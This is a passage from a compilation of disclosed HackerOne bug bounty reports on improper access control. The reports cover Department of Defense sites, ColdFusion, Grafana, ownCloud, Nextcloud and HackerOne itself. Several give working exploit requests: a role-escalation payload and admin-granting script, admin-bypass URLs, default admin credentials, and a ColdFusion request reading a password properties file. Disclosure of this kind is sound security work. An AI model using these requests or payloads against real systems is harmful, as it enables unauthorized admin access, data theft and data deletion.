["{\"msg\":\"method\",\"method\":\"insertOrUpdateUser\",\"params\":[{\"_id\": \"<USER_ID>\", \"roles\": [\"user\", \"bot\"]}],\"id\":\"17\"}"]
```

### Malicious Integrations Script
```javascript
this.Roles.addUserRoles("9HN4Brdmo2Qc2wsiX", "admin")
class Script {
  process_incoming_request({ request }) {};
}
```

## Suggested mitigation

  * Only allow administrators to modify user groups
  * Isolate Integration script context from server application

## Impact

Guest users can become server administrator.

---

### [Add any depot to your app and access its contents without decryption key;  via /apps/setcommonredists](https://hackerone.com/reports/1018368)

- **Report ID:** `1018368`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Valve
- **Reporter:** @njbooher3
- **Bounty:** - usd
- **Disclosed:** 2024-07-30T23:34:36.527Z
- **CVE(s):** -

**Summary (team):**

A parameter-validation error on an endpoint used to configure redistributable depots could be forced to add external depots to an existing (attacker-owned) app.

**Summary (researcher):**

.

---

### [Automatic Admin Access](https://hackerone.com/reports/1991214)

- **Report ID:** `1991214`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @bulldawg
- **Bounty:** - usd
- **Disclosed:** 2024-07-19T14:44:14.917Z
- **CVE(s):** -

**Vulnerability Information:**

URL: https://█████████.mil/apexcrrel/f?p=150:1:23467499301323::NO:::

When visiting the following URL, the user is automatically signed into a user with administrative access. 

███

This user is allowed to:
1. Create new submissions, allowing file uploads

████████

2. See all submissions going back to 2012

██████████

3. Manage users - add, delete, and link users. This user could also add the Administrator role to a user. 

███

████

4. Send spam emails to all users

█████████

5. Access admin tools like publishing data and removing publications

██████████

I did not test all functionality provided by this access as I did not want to damage the integrity of the data on the web application.

Please let me know if you would like me to test adding/deleting users, creating submissions and testing file upload vulnerabilities, etc. This would also allow me to demonstrate the severity of this vulnerability as well as find new vulnerabilities in the application. For example, with permission I would like to test the file upload functionality for vulnerabilities.

## Impact

This is a critical vulnerability. This impacts the integrity, confidentiality, and availability of the application. 

Integrity: Unauthorized users can upload arbitrary data, publish data, and delete publications.
Confidentiality: This exposes names, emails, and submissions.
Availability: This administrative user can delete other user accounts, denying them access.

## System Host(s)
███████.mil

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1. Visiting URL: https://███.mil/apexcrrel/f?p=150:24:23467499301323::NO:::
2. View active user in top right corner: "ben auto log user". This user is an administrator.

## Suggested Mitigation/Remediation Actions

---

### [Endpoint Redirects to Admin Page and Provides Admin role](https://hackerone.com/reports/1991290)

- **Report ID:** `1991290`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @bulldawg
- **Bounty:** - usd
- **Disclosed:** 2024-07-19T14:43:23.062Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
By navigating to https://████████.mil/apexcrrel/f?p=165:56, the user will automatically be redirected to the web application admin portal with Admin access.

**Description:**
There is a web application running at the following URL:

https://█████.mil/apexcrrel/f?p=165:1::::::

████

For context, this is a web application running on a Oracle Apex Express platform. The '165' in the 'p' parameter in the URL is a unique identifier for the web application. The '1' following the '165' represents the page that the user is viewing. 

The page '56' can be used to automatically obtain administrator access to this application. 

Here we can see that we can't access the 45th page (https://████.mil/apexcrrel/f?p=165:45) because we are not an Admin.

███████

However, navigating to the 56th page (https://██████████.mil/apexcrrel/f?p=165:56) automatically redirects to the 45th page but provides a valid admin session. 

█████████

We can also see that we have the ability to manage users, including admin users.

██████████

As a note, I found this due to the application at https://████.mil/apexcrrel/f?p=164:5::::::
This is a separate web application, given that the unique identifier is now 164. 

On this page there is a 'Go To Admin' button. When clicking this, it calls the /apexcrrel/DISDI_PORTAL_DEV.login_admin endpoint. This redirects the user to the 56th page, breaking the access control and providing Admin access.

███████

## Impact

This is a critical severity bug that impacts confidentiality, integrity, and availability. 

Confidentiality: An attacker can obtain first names, last names, email addresses, and filenames of uploaded files.
Integrity: An attacker can upload files, edit documents, and edit user roles
Availability: An attacker could remove all users, including admins, making it difficult for users to use the application.

## System Host(s)
█████.mil

## Affected Product(s) and Version(s)
Oracle Apex Express

## CVE Numbers


## Steps to Reproduce
1. To verify that you do not have any valid sessions to view the admin pages, visit https://██████.mil/apexcrrel/f?p=165:45
2. Now, navigate to https://█████████.mil/apexcrrel/f?p=165:56
3. You now have admin access to the application.

## Suggested Mitigation/Remediation Actions

---

### [Missing Access Control Allows for User Creation and Privilege Escalation ](https://hackerone.com/reports/2442229)

- **Report ID:** `2442229`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @bulldawg
- **Bounty:** - usd
- **Disclosed:** 2024-07-19T14:37:34.538Z
- **CVE(s):** -

**Vulnerability Information:**

Hello,

The RSI Test Environment application at https://███████████████/ords/f?p=842:1 does not enforce access controls on the user management endpoint. This allows any unauthenticated person to both create new users as well as give them the administrator role. This then provides access to https://███████████████/ords/f?p=303 as an administrator.

The user management endpoint can be accessed at https://████████████/ords/f?p=842:9:::::: 

I have attached screenshots which show this misconfiguration.

If there are any questions or concerns please let me know as I am more than happy to provide additional information!

## Impact

This is a critical security issue which poses risk to the confidentiality and integrity of data within the ███████████████ application. An attacker would be able to view, modify, and/or delete the restricted information and documents within the application as well as manage other user accounts. This provides unauthorized access that is otherwise restricted to USG-authorized individuals per the disclaimer.

## System Host(s)
█████████████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1. Visit https://█████████████████/ords/f?p=842:9, which is the user management endpoint for the environment.
2. Under "Add New User", enter an email address, first name, last name, and select an Agency.
3. Under "Assign User Roles", select the newly created user and apply the administrator role.
4. Retrieve the credentials for the new account that were sent to the email address entered.
5. Go to https://███████████/ords/f?p=303 and login using the credentials.
6. Change to a new password on prompt.
7. View the logged in username in the top right with the Administrator role.

## Suggested Mitigation/Remediation Actions
Enforce access controls on page 9 of the application with an ID of 842.

---

### [CVE-2023-26347 in https://████.mil/hax/..CFIDE/adminapi/administrator.cfc?method=getBuildNumber&_cfclient=true](https://hackerone.com/reports/2518407)

- **Report ID:** `2518407`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @traveler5260
- **Bounty:** - usd
- **Disclosed:** 2024-07-19T14:16:46.726Z
- **CVE(s):** CVE-2023-26347

**Vulnerability Information:**

**Description:**
Adobe ColdFusion versions 2023.5 (and earlier) and 2021.11 (and earlier) are affected by an Improper Access Control vulnerability that could result in a Security feature bypass. An unauthenticated attacker could leverage this vulnerability to access the administration CFM and CFC endpoints.

## References
https://nvd.nist.gov/vuln/detail/CVE-2023-26347
https://vuldb.com/?id.245747

## Impact

An attacker, without authentication, could exploit this vulnerability to gain access to the administration CFM and CFC endpoints.

## System Host(s)
██████████.mil

## Affected Product(s) and Version(s)
https://█████.mil/hax/..CFIDE/adminapi/administrator.cfc?method=getBuildNumber&_cfclient=true

## CVE Numbers
CVE-2023-26347

## Steps to Reproduce
Access to the https://████████.mil/hax/..CFIDE/adminapi/administrator.cfc?method=getBuildNumber&_cfclient=true site.

## Suggested Mitigation/Remediation Actions
Check the [Release Note](https://helpx.adobe.com/security/products/coldfusion/apsb23-52.html) and upgrade the version of Adobe ColdFusion product

---

### [Can reshare read&share only folder with more permissions](https://hackerone.com/reports/2289425)

- **Report ID:** `2289425`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Nextcloud
- **Reporter:** @fernandoenzo
- **Bounty:** 750 usd
- **Disclosed:** 2024-07-14T14:32:54.698Z
- **CVE(s):** CVE-2024-37882

**Summary (team):**

Security advisory at https://github.com/nextcloud/security-advisories/security/advisories/GHSA-jjm3-j9xh-5xmq

---

### [Subdomain takeover ████████.mil](https://hackerone.com/reports/2499178)

- **Report ID:** `2499178`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @martinvw
- **Bounty:** - usd
- **Disclosed:** 2024-06-27T17:34:10.298Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**

The subdomain `█████.mil` is pointing to `peosol-lg.███████.`, the domain `██████` is currently available for registration as can be seen at https://www.godaddy.com/nl-nl/domainsearch/find?domainToCheck=█████

Given the rules, residency of the US, of the `us`-tld I decided not to register the domain, also I do believe the output to be enough.

## References

## Impact

Using this vulnerability an attacker can:
- host unwanted/malicious content under your domain
- receive email on subdomains mentioned above
- effectively execute cross-site scripting attacks
- in some cases, steal cookie data
- in some cases, trick password managers into filling passwords

## System Host(s)
██████████.mil

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
See the DIG output:

```
√ martinvw@denali:~/src > dig █████.mil

; <<>> DiG 9.10.6 <<>> ████.mil
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 44977
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 512
;; QUESTION SECTION:
;█████████.mil.			IN	A

;; ANSWER SECTION:
██████████.mil.		3600	IN	CNAME	peosol-lg.███.

;; AUTHORITY SECTION:
us.			900	IN	SOA	a.cctld.us. admin.tldns.godaddy. 1715345748 1800 300 604800 1800

;; Query time: 166 msec
;; SERVER: 8.8.8.8#53(8.8.8.8)
;; WHEN: Fri May 10 15:06:32 CEST 2024
;; MSG SIZE  rcvd: 148
```

And the GoDaddy page: https://www.godaddy.com/nl-nl/domainsearch/find?domainToCheck=███

And whois:

```
√ martinvw@denali:~/src > whois ████████.
% IANA WHOIS server
% for more information on IANA, visit http://www.iana.org
% This query returned 1 object

refer:        whois.nic.us

domain:       US

organisation: Registry Services, LLC
address:      100 S. Mill Ave, Suite 1600
address:      Tempe AZ 85281
address:      United States of America (the)

contact:      administrative
name:         IANA Contact
organisation: Registry Services, LLC
address:      100 S. Mill Ave, Suite 1600
address:      Tempe AZ 85281
address:      United States of America (the)
phone:        +1 480 505 8800
fax-no:       +1 480 393 4275
e-mail:       iana@about.us

contact:      technical
name:         IANA Contact
organisation: Registry Services, LLC
address:      100 S. Mill Ave, Suite 1600
address:      Tempe AZ 85281
address:      United States of America (the)
phone:        +1 480 505 8800
fax-no:       +1 480 393 4275
e-mail:       iana@about.us

nserver:      B.CCTLD.US 156.154.125.70 2001:502:ad09:0:0:0:0:29
nserver:      F.CCTLD.US 2001:500:3682:0:0:0:0:11 209.173.58.70
nserver:      K.CCTLD.US 156.154.128.70 2001:503:e239:0:0:0:3:1
nserver:      W.CCTLD.US 2001:dcd:1:0:0:0:0:15 37.209.192.15
nserver:      X.CCTLD.US 2001:dcd:2:0:0:0:0:15 37.209.194.15
nserver:      Y.CCTLD.US 2001:dcd:3:0:0:0:0:15 37.209.196.15
ds-rdata:     59017 8 2 7daf469d42b5d8e5537fd4dd4b6057710e9a61f72c32eb7fb6526f52277ec2b0

whois:        whois.nic.us

status:       ACTIVE
remarks:      Registration information: http://www.nic.us

created:      1985-02-15
changed:      2024-04-16
source:       IANA

# whois.nic.us

No Data Found
URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/
>>> Last update of WHOIS database: 2024-05-10T13:10:37Z <<<
```

## Suggested Mitigation/Remediation Actions
Remove CNAME record █████████.mil

---

### [Program Member Could Duplicate Report To A Non Related Program Original Report ](https://hackerone.com/reports/2513082)

- **Report ID:** `2513082`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** HackerOne
- **Reporter:** @v0id1
- **Bounty:** - usd
- **Disclosed:** 2024-06-19T12:22:44.517Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
Hello Hackerone team, I found a vulnerability on setting duplicate report as program owner. I'm able to duplicate a report to a report that doesn't have relation with the program. For example we can duplicate to a public report in hacktivity. 

### Steps To Reproduce
1. Create a sandbox program
2. On a report, select closed as duplicate and select another report from your program
3. Then intercept a request sent to /reports/bulk. Change the `original_report_id` parameter to 2279010 (A report to Portswigger #2279010)
{F3284733}  
{F3284729}

In addition after some analysis, I found that we also could mark as duplicate to a private report based on who's marking as duplicate. For example for me I would be able to duplicate to a report with id #2441985 which was a private report
{F3284759}

## Impact

- A Program could mark as duplicate a report that even doesn't have correlation to the original report and security researcher wouldn't be able to validate it
- Integrity issue since the duplicate report should be only come from the program related report

---

### [CVE-2021-39226 Discovered on endpoint https://██████/api/snapshots](https://hackerone.com/reports/2408480)

- **Report ID:** `2408480`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @adam_wallwork
- **Bounty:** - usd
- **Disclosed:** 2024-06-18T14:41:39.123Z
- **CVE(s):** CVE-2021-39226

**Vulnerability Information:**

**Description:**
CVE-2021-39226 Discovered on endpoint https://███████/api/snapshots/:key where this issue poses a significant risk to the confidentiality and integrity of snapshot data, allowing both authenticated and unauthenticated users unauthorized access and deletion capabilities.

## References
https://nvd.nist.gov/vuln/detail/CVE-2021-39226

## Impact

"In affected versions unauthenticated and authenticated users are able to view the snapshot with the lowest database key by accessing the literal paths: /dashboard/snapshot/:key, or /api/snapshots/:key. If the snapshot "public_mode" configuration setting is set to true (vs default of false), unauthenticated users are able to delete the snapshot with the lowest database key by accessing the literal path: /api/snapshots-delete/:deleteKey. Regardless of the snapshot "public_mode" setting, authenticated users are able to delete the snapshot with the lowest database key by accessing the literal paths: /api/snapshots/:key, or /api/snapshots-delete/:deleteKey. The combination of deletion and viewing enables a complete walk through all snapshot data while resulting in complete snapshot data loss.".

Source: https://nvd.nist.gov/vuln/detail/CVE-2021-39226

## System Host(s)
██████

## Affected Product(s) and Version(s)
Grafana

## CVE Numbers
CVE-2021-39226

## Steps to Reproduce
Visit the endpoint 'https://████/api/snapshots' and use '/:key' and  to delete visit 'https://█████/api/snapshots-delete' and use '/:deleteKey' to delete and view all snapshot data.

## Suggested Mitigation/Remediation Actions

---

### [Access Control Vulnerability Enabling Unauthorized Access to Limited Disclosure Reports](https://hackerone.com/reports/2516250)

- **Report ID:** `2516250`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** HackerOne
- **Reporter:** @akashhamal0x01
- **Bounty:** - usd
- **Disclosed:** 2024-06-17T17:23:20.404Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**

Hi there, I hope you are doing well :)

I found a vulnerability  which allows me to close  a report as duplicate  of another program report. This can cause problems in various ways, i will include some of them and rest needs to be verified on Hackerone side what additional impact it can cause and its root cause analysis.


### Steps To Reproduce

1.  Create a Sandbox program
2.  Invite a user with Report and Engagement access
3. Accept invitation from User B and login
4. Check any report and select option to Close Report as duplicate and this will be the HTTP request:

```HTTP

POST /reports/bulk HTTP/2
Host: hackerone.com
Cookie: <USER B Cookies>
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://hackerone.com/reports/2424755
X-Csrf-Token: <USER B CSRF TOKEN>
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
X-Datadog-Origin: rum
X-Datadog-Parent-Id: 2173163794632761452
X-Datadog-Sampling-Priority: 1
X-Datadog-Trace-Id: 3844362884923386826
Content-Length: 289
Origin: https://hackerone.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

message=s&substate=duplicate&original_report_id=███████&reference=&add_reporter_to_original=false&reply_action=close-report&mark_ineligible_for_bounty=false&unassign_report_on_close=false&code_review_patch=&code_review_diff_url=&reports_count=1&report_ids%5B%5D=<your report ID>&bounty_currency=USD

```

Here, Only replace the values which are enclosed inside <> and then forward the request. Notice that the response is 200 OK and the report is closed as duplicate of  █████ which is publicly disclosed report of Hackerone  program

## Impact

There were many scenarios in my mind regarding impact but these are most relevant ones:

 It can impact Automation Pipelines because there can be many reports and the program can mistakenly enter other report ID . 

This one is just assumption but i believe its possible:

When you close a report as duplicate of other report (Original report), it will show  on right side panel the reports which are duplicate of that particular report like this:

{F3291232}

So my assumption is that , it might show like this to the program team  in a genuine publicly disclosed report as the attacker can dupe his/her report to public report and the public report will be shown like that to the program manager or the viewers (participants or collaborators)  which alternatively means it gives ability for any attacker to make other public reports look like they have duplicates but the duplicates are other reports from other program


Remaining impact, root cause and potential impacts are to be evaluated by h1 team as i am limited by my sandbox program and its privilege.

**Summary (team):**

**Summary**
A vulnerability has been discovered that allows an unauthorized user to close a report on the HackerOne platform as a duplicate of another report from a different program or organization. This improper access control issue enables potential misuse and disruption of the reporting process.

**RCA**
We relied on an ACL check `can?(:view, original_report)` that the report was visible to the team member closing the report as a duplicate, but we didn’t take into account limited disclosed reports also return true on this ACL check or that the original report was in the same organization.

Our forensic investigation confirmed that only the report mentioned in this report was affected. The customer is notified about this.

---

### [Authentication Bypass with usage of PreSignedURL](https://hackerone.com/reports/2337427)

- **Report ID:** `2337427`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** ownCloud
- **Reporter:** @kolokokop
- **Bounty:** 2000 usd
- **Disclosed:** 2024-03-22T17:06:13.638Z
- **CVE(s):** -

**Vulnerability Information:**

Hello,

## Summary

It was identified that ownCloud Infinite Scale (oCIS) is prone to vulnerability that allows access any file without authentication. Prior knowledge of username and filename is needed to access file.

In this instance, vulnerability was result of the default enabled PreSignedURL, which incorrectly checks the expiry date in `OC-Date` and `OC-Expires` variables. If the date has expired, the signing key has not been checked and access to file is granted.

## Steps to reproduce

1. Login to the ownCloud Infinite Scale instance - e.g. `admin` username was used.

2. Create new file - Press "New" and "Plain text file" - `secret.txt` filename was used.

{F3011022}

3. Add some content to the file - e.g. "secret file content" and save the file.

{F3011023}

In addition, it is possible to check that the file is not public or shared with anyone.

{F3011024}

4. Access the file without authentication with the following link builded with known username and known filename:

`https://{ownload-instance}/remote.php/dav/files/{username}/{filename}?OC-Credential={username}&OC-Verb=GET&OC-Expires=60&OC-Date=2024-01-27T00:00:00.000Z&OC-Signature=notchecked`

In particular the following link was used:

`https://localhost:9200/remote.php/dav/files/admin/secret.txt?OC-Credential=admin&OC-Verb=GET&OC-Expires=60&OC-Date=2024-01-27T00:00:00.000Z&OC-Signature=notchecked`

{F3011032}

## Details

Default settings for PreSignedURL allows usage of GET requests and therefore download files.


[`services/proxy/pkg/config/defaults/defaultconfig.go`](https://github.com/owncloud/ocis/blob/v4.0.5/services/proxy/pkg/config/defaults/defaultconfig.go#L74):

```go
		PreSignedURL: config.PreSignedURL{
			AllowedHTTPMethods: []string{"GET"},
			Enabled:            true,
		},
```

Inside function [`validate`](https://github.com/owncloud/ocis/blob/v4.0.5/services/proxy/pkg/middleware/signed_url_auth.go#L73) another function [`urlIsExpired`](https://github.com/owncloud/ocis/blob/v4.0.5/services/proxy/pkg/middleware/signed_url_auth.go#L126) is called to check for expiration of `OC-Date` and `OC-Expires`.However, in the case of expired dates, the function returns a null error, resulting in successful authentication of requests without checking the user's signing signature/key.

{F3011035}

{F3011036}

{F3011037}

## Vulnerable versions

The following tags on GitHub was found to be vulnerable - it was not tested on different branches/tags:

- v5.0.0-rc.3
- v5.0.0-rc.2
- v4.0.5

## Temporary remediation

Disabling PreSignedURLs, e.g. with environment variable `PROXY_ENABLE_PRESIGNEDURLS=false` blocked unrestricted access to files.

## Impact

Broken Access Control vulnerabilities have severe consequences, both for organizations and end-users. Attackers exploiting Broken Access Control can gain access to sensitive data, including personal information, financial records, or confidential documents, compromising user privacy and security. In this instance, it was possible to access the organization's and users' private files without authentication.

---

### [Lack of Tenant Scoping Enables Limited Cross-Tenant Data Querying and Mutation](https://hackerone.com/reports/2327238)

- **Report ID:** `2327238`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** Enjin
- **Reporter:** @tushar_rec0n
- **Bounty:** - usd
- **Disclosed:** 2024-01-25T11:00:33.683Z
- **CVE(s):** -

**Summary (team):**

@tushar_rec0n was able to demonstrate on the [Enjin Platform](https://platform.enjin.io) that it was possible, for certain queries and mutations, to query and mutate data cross-tenant (ie. to query or mutate someone else's data).

It's worth noting that the Enjin Platform does have a plethora of queries and mutations that are intended to work cross-tenant, although this report specifically highlighted ones that were not intended to do so.

A full assessment of the vulnerability was conducted and, outside of the three duplicate reports, we identified this vulnerability had not been used by anyone else.

---

### [View Titles of Private Reports with pending email invitation](https://hackerone.com/reports/2312029)

- **Report ID:** `2312029`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** HackerOne
- **Reporter:** @ahacker1
- **Bounty:** - usd
- **Disclosed:** 2024-01-16T09:17:25.182Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**

If a private report has a pending email invitation for collaboration, an anonymous user can see the title of the report.
This only works for anonymous users, and the collaboration invitation must be through Manage Collaborators invitation panel.

**Description:**

### Steps To Reproduce

1. As victim:
In a report to a bug bounty program, add a collaborator, using any email, such as: ██████████
Save the integer ID of the report.

2. In a new, **anonymous/unauthenticated/logged-out** session:
Send GraphQL request, replacing PRIVATE_REPORT_ID integer:
```graphql
{
  report(id:IPRIVATE_REPORT_ID){
    title
  }
}
```
OR run JS implementation:
By visiting hackerone.com/hacktivity as anonymous:
```js
const csrf_token = document.getElementsByName("csrf-token")[0].getAttribute("content")
const REPORT_ID = PRIVATE_REPORT_ID // integer

var resp = await(await fetch("https://hackerone.com/graphql", {
  "headers": {
    "accept": "*/*",
    "content-type": "application/json",
    "x-csrf-token": csrf_token,
  },
  "body": JSON.stringify({
    "operationName": "HacktivitySearchQuery",
    "variables": {
        "reportId": REPORT_ID
    },
    "query": `query HacktivitySearchQuery($reportId: Int!) {
  report(id: $reportId){
    id
    url
    title
  }
}
`
}),
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
})).json()
console.log(resp.data.report)
```
The title of the report is the response, confirming the vulnerability.

## Impact

Can read titles of possibly unfixed reports. This can be leveraged against the program, depending on the specificity of the title in the report.

---

### [GHES Management console EoP (editor to site admin)](https://hackerone.com/reports/2197796)

- **Report ID:** `2197796`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** GitHub
- **Reporter:** @imrerad
- **Bounty:** - usd
- **Disclosed:** 2024-01-08T17:37:08.974Z
- **CVE(s):** CVE-2023-46647

**Summary (team):**

Improper privilege management in all versions of GitHub Enterprise Server allows users with authorized access to the management console with an editor role to escalate their privileges by making requests to the endpoint used for bootstrapping the instance.
[CVE-2023-46647](https://nvd.nist.gov/vuln/detail/CVE-2023-46647)

**Summary (researcher):**

The `Manage:App` Rails controller of the [Github Management console](https://docs.github.com/en/enterprise-server@3.8/admin/administering-your-instance/administering-your-instance-from-the-web-ui/about-the-management-console) featured a method *post "/start"*, which was accessible by both editors and operators (and of course by site admins as well). This method allowed changing the license of the deployment and also resetting the site admin password. A malicious/compromised editor account could escalate their privileges to site admin and access the GHES deployment without any restrictions.

---

### [Default Admin Username and Password on ███](https://hackerone.com/reports/2262365)

- **Report ID:** `2262365`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @maskedpersian
- **Bounty:** - usd
- **Disclosed:** 2023-12-21T17:35:19.800Z
- **CVE(s):** -

**Vulnerability Information:**

It is possible to access the application is using the default username and password 
Steps To Reproduce:
1-Go to https://███/geoportal/ and login with credentials:
user and password: admin
user and password: gptadmin
Poc video attached

## Impact

A Department of Defense website was misconfigured in a manner that may have allowed a malicious user to login with administrator for the default organization account credentials and delete posts , edit website

## System Host(s)
███

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
POC video

## Suggested Mitigation/Remediation Actions

---

### [Unauthenticated File Read Adobe ColdFusion](https://hackerone.com/reports/2248781)

- **Report ID:** `2248781`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @r00tdaddy
- **Bounty:** - usd
- **Disclosed:** 2023-12-21T17:33:42.175Z
- **CVE(s):** CVE-2023-26360

**Vulnerability Information:**

Unauthenticated Arbitrary File Read vulnerability due to de serialization of untrusted data in Adobe ColdFusion.

## Impact

The impact of this vulnerability could result in unauthorized access to sensitive data and actions within the affected Adobe ColdFusion instances.

## System Host(s)
█████████

## Affected Product(s) and Version(s)
The vulnerability affects ColdFusion 2021 Update 5 and earlier as well as ColdFusion 2018 Update 15 and earlier

## CVE Numbers
CVE-2023-26360

## Steps to Reproduce
POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=wizardHash&_cfclient=true&returnFormat=wddx&inPassword=foo HTTP/1.1
Host: ███
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Connection: close
Content-Length: 121
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate, br

_variables=%7b%22_metadata%22%3a%7b%22classname%22%3a%22i/../lib/password.properties%22%7d%2c%22_variables%22%3a%5b%5d%7d

Password hash is disclosed in the response:

## Suggested Mitigation/Remediation Actions
Apply the necessary security patches or updates provided by Adobe to fix the vulnerability.

---

### [Adobe ColdFusion Access Control Bypass - CVE-2023-38205](https://hackerone.com/reports/2090435)

- **Report ID:** `2090435`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @0r10nh4ck
- **Bounty:** - usd
- **Disclosed:** 2023-12-21T17:32:48.643Z
- **CVE(s):** CVE-2023-38205, CVE-2023-29298

**Vulnerability Information:**

**Description:**
Hi team,
The subdomain https://████ is with adobe ColdFusion vulnerable with CVE-2023-38205.
This vulnerability is a bypass path created for CVE-2023-29298.

## References

https://www.rapid7.com/blog/post/2023/07/19/cve-2023-38205-adobe-coldfusion-access-control-bypass-fixed/

## Impact

If an attacker accesses a URL path of /hax/..CFIDE/wizards/common/utils.cfc the access control can be bypassed and the expected endpoint can still be reached, even though it is not a valid URL path .

## System Host(s)
█████████

## Affected Product(s) and Version(s)


## CVE Numbers
CVE-2023-38205

## Steps to Reproduce
1. Go to: https://█████████/hax/..CFIDE/wizards/common/utils.cfc?method=wizardHash&inPassword=foo&_cfclient=true&returnFormat=wddx
2. See the remote method call wizardHash on the/CFIDE/wizards/common/utils.cfc endpoint.

## Suggested Mitigation/Remediation Actions

---

### [Unauthenticated Remote Access to Testing Endpoint](https://hackerone.com/reports/2192984)

- **Report ID:** `2192984`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** IBM
- **Reporter:** @sajidraza
- **Bounty:** - usd
- **Disclosed:** 2023-12-04T14:57:56.893Z
- **CVE(s):** -

**Summary (team):**

Unauthenticated remote access to a testing endpoint was reported to IBM, analyzed and has been remediated. Thank you to our external researcher @sajidraza.

---

### [Permissions policies can be bypassed via Module._load and require.extensions (High) (CVE-2023-30587)](https://hackerone.com/reports/2188126)

- **Report ID:** `2188126`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Internet Bug Bounty
- **Reporter:** @mattaustin
- **Bounty:** 1165 usd
- **Disclosed:** 2023-11-30T15:36:26.163Z
- **CVE(s):** CVE-2023-32002

**Vulnerability Information:**

[https://hackerone.com/reports/1960870](https://hackerone.com/reports/1960870)

The use of `Module._load()` and `require.extensions[".js"]` can bypass the policy mechanism and require modules outside of the policy.json definition for a given module.
This vulnerability affects all users using the experimental policy mechanism in all active release lines: 16.x, 18.x and, 20.x.

## Impact

Permission policies limit a project to a specific set of authorized node js built-in modules. For example a project could attempt to limit the use of child_process which could be bypassed leading to remote code execution.

**Summary (team):**

Permissions policies can be bypassed via Module._load (HIGH)(CVE-2023-32002)
The use of Module._load() can bypass the policy mechanism and require modules outside of the policy.json definition for a given module.

Please note that at the time this CVE was issued, the policy mechanism is an experimental feature of Node.js.

Impacts:
This vulnerability affects all users using the experimental policy mechanism in all active release lines: 16.x, 18.x and, 20.x.

Thank you, to mattaustin for reporting this vulnerability and thank you Rafael Gonzaga and Bradley Farias for fixing it.

Full Security Advisory: https://nodejs.org/en/blog/vulnerability/august-2023-security-releases

---

### [Delete external storage of any user](https://hackerone.com/reports/2212627)

- **Report ID:** `2212627`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Nextcloud
- **Reporter:** @cx75fa
- **Bounty:** - usd
- **Disclosed:** 2023-11-21T09:22:22.998Z
- **CVE(s):** CVE-2023-48239

**Vulnerability Information:**

A security vulnerability was uncovered that allowed standard users to remove external storage resources from any user account in the application. This flaw was particularly concerning because it enabled unauthorized users to delete these resources based on a system-generated ID, which automatically incremented, without requiring any special privileges. This issue didn't grant access to the data but allowed for the indiscriminate removal of external storage associated with user accounts, potentially leading to data loss and disruption of service for affected users.

Reproduction Steps:
1.Begin by logging in with a standard user account and establish an external storage connection.
2. Afterward, update the storage configuration. Observe that the following request is generated:
```
PUT /apps/files_external/userstorages/<storage_id> HTTP/1.1
Host: 127.0.0.1:9090
[REDACTED]

{"mountPoint":"simpleuser","backend":"owncloud","authMechanism":"password::logincredentials","backendOptions":{"host":"cq6xxrdnw1941wu9jk4gcyfuglmfa4.oastify.com","root":"","secure":true},"testOnly":true,"id":<storage_id>,"mountOptions":{"enable_sharing":true,"encoding_compatibility":false,"encrypt":true,"filesystem_check_changes":1,"previews":true,"readonly":false}}
```
3.Next, log in to the application with an administrative user account or any other role and establish a storage connection.
4.Observe that each new storage created increments the ID automatically. For instance, it could become 28.
5. Using the standard user role, issue the request once more to modify the ID linked to the administrative storage. Observe that this action leads to the removal of the storage from the administrator's account.

VIDEO POC:
{F2778950}

## Impact

